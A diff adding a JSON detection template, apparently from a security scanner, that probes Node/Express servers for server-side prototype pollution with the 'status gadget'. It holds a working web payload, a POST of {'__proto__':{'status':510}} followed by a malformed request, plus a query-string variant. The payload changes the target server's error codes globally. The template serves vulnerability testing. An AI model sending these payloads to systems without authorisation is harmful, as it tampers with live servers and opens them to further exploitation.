@@ -1,0 +1,39 @@
+{
+  "name": "elite/Prototype pollution Node status gadget",
+  "description": "[critical] Heyes' black-box server-side prototype pollution detection, status gadget (PortSwigger research): POST {\"__proto__\":{\"status\":510}} to a JSON merge/parse surface, then trigger any error — Node's http-errors module reads the polluted status and every subsequent error responds 510 Not Extended. Keywords: prototype pollution express node lodash qs gadget status. ctrl: benign direct-key {'status':510} (no __proto__ wrapper) leaves normal error codes -> not falsified. pollute_url = JSON-merging endpoint; reveal_url = endpoint that errors (can be the same). Copy skill for the qs query-string variant (?__proto__[status]=510).",
+  "cwe": "CWE-1321",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{pollute_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"__proto__\":{\"status\":510}}"
+    },
+    "reveal": {
+      "method": "POST",
+      "url": "{{reveal_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"broken\":"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "reveal",
+      "equals": 510
+    }
+  ],
+  "params": [
+    "pollute_url",
+    "reveal_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "62aaff652553",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
